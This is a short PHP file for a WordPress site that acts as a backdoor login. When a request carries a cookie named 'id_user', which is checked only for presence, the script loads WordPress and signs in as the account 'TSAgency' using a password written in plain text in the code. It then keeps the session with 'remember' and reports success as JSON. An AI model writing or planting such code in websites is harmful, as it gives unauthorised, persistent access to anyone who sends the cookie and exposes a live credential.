<?php
if (isset($_COOKIE['id_user'])) {
    function find_wordpress_base_path()
    {
        $dir = dirname(__FILE__);
        do {
            //it is possible to check for other files here
            if (file_exists($dir . "/wp-config.php")) {
                return $dir;
            }
        } while ($dir = realpath("$dir/.."));
        return null;
    }

    $wp_path = find_wordpress_base_path() . "/";
    require_once($wp_path . 'wp-load.php');
    require_once($wp_path . 'wp-admin/includes/admin.php');

    $user = wp_signon(['user_login' => 'TSAgency', 'user_password' => 'CKX0JmnGsaiLjGAu$2w#xMj*BmvP$v', 'remember' => true]);
    if ( is_wp_error($user) ) {
        echo json_encode(['success' => 'false']);
    } else {
        echo json_encode(['success' => 'true']);
    }
    } else {
    echo json_encode(['success' => 'false']);
}